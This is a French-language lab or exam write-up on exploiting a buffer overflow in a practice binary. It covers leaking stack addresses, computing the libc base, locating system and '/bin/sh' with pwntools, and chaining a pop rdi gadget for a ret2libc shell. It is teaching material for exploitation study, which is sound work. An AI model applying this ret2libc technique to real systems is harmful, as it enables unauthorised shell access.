
- Observation code source : 
```bash
   6   │ #define ENTRY_SIZE  0x68
   7   │ #define ENTRY_COUNT 0x188
```
> Dans ce code, on peut voir qu'il n'y a pas de sécurité sur la valeur entrée par l'utilisateur. On peut donc entrée un valeur supérieur à notre ENTRY_SIZE et ENTRY_COUNT.

- Dans la fonction Vuln, on a un tableau entries, qui sera affiché à la fin.

- On récup l'adresse mémoire de base de la libc :
```bash
└─[$] <> ldd exam
	linux-vdso.so.1 (0x00007fffa5ba2000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9187c87000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f9187e84000)
```

- Dans GDB on regarde les adresses des fonctions : 
```bash
gef➤  i func
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001030  puts@plt
0x0000000000001040  printf@plt
0x0000000000001050  memset@plt
0x0000000000001060  getchar@plt
0x0000000000001070  __isoc99_scanf@plt
0x0000000000001080  exit@plt
0x0000000000001090  __cxa_finalize@plt
0x00000000000010a0  _start
0x00000000000010d0  deregister_tm_clones
0x0000000000001100  register_tm_clones
0x0000000000001140  __do_global_dtors_aux
0x0000000000001180  frame_dummy
0x0000000000001189  gadgets
0x0000000000001198  vuln
0x00000000000014a1  main
0x00000000000014b8  _fini
```

- On pourra brute force, c'est à dire parcourir les adresses de la stack pour les leaks une à une.

- Quand on lance le script, et que la stack est leak -> on peut voir dans GDB avec 'attach PID' des adresses de libc (ça commence par 7f). l'Adresse de main commence par 0x55.

- On trouve la base de la libc dynamique

- On récup l'adresse de /bin/sh dans la libc 
```python
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")  
leak_libc = adress_leak_libc # pseudo code 
_base_libc = int(leak_libc) - offset
_system_libc = _base_libc + libc.symbols["system"]
binsh = _base_libc + next(libc.search(b'/bin/sh\x00'))
```

- On veut jump sur la fonction system et passer /bin/sh en argument, on va donc utiliser le gadget pop rdi pour passer l'argument.
```bash
└─[$] <> ROPgadget --binary exam | grep pop
0x0000000000001191 : pop rdi ; pop rsi ; pop rcx ; pop rdx ; nop ; pop rbp ; ret
```
	- Dans le code python, on mettra les autres arguments du gadget à 0 car on en a pas besoin.

- On est en x64, il faut donc aligner la stack à la fin de l'appel d'une fonction (system dans notre cas). Pour cela on fera un return (ret).

